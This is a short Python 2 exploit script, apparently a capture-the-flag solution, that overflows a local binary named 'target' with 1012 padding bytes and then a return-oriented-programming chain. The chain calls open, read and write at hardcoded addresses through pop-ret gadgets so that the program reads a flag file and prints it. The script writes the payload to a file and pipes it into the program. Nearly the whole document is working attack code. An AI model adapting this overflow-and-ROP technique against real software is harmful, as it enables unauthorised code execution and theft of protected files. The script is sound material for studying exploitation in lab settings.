#!/usr/bin/env python2


import struct
import subprocess as sp

def p32(n):
    return struct.pack("<I", n)


# Open flag, Read_flag, show_flag

FN_OPENFLAG = 0x0806d1c0
ADDR_READFLAG = 0x080bb136 #=POP-RET
SYM_OPENFLAG = 0x080be398 # g...

FN_READFLAG = 0x0806d230
ADDR_SHOWFLAG = 0x08048913 #POP-POP-POP-RET
FD = 0x3
BUF = 0x80ea4c0
SIZE = 0x10000


FN_WRITEFLAG = 0x0806d2a0
#AAAA
STDOUT= 0x0
#POP-POP-POP-RET = 0x08048913

def get_payload():
    return "A" * 1012	\
        + p32(FN_OPENFLAG)    	\
        + p32(ADDR_SHOWFLAG)    \
        + p32(SYM_OPENFLAG) 	\
	+ p32(STDOUT)		\
	+ p32(STDOUT)		\
        + p32(FN_READFLAG) 	\
        + p32(ADDR_SHOWFLAG) 	\
        + p32(FD) 	\
        + p32(BUF) 	\
        + p32(FN_WRITEFLAG) 	\
        + p32(FN_WRITEFLAG) 	\
	+ "BBBB"		\
        + p32(STDOUT) 	\
        + p32(BUF) 	\
	+ "\n"
        #+ p32(FN_READFLAG)      \
        #+ p32(ADDR_SHOWFLAG)    \
        #+ p32(CAN_RF1)       	\
	#+ p32(CAN_RF2)		\
	#+ p32(FN_SHOWFLAG)	\
	#+ 'AAAA'		\
	#+ "\n"		
        
if __name__ == '__main__':
    with open("temp.txt","wb") as fw:
	fw.write(get_payload()) 
    p = sp.Popen("./target", stdin=sp.PIPE)
    p.stdin.write(get_payload())
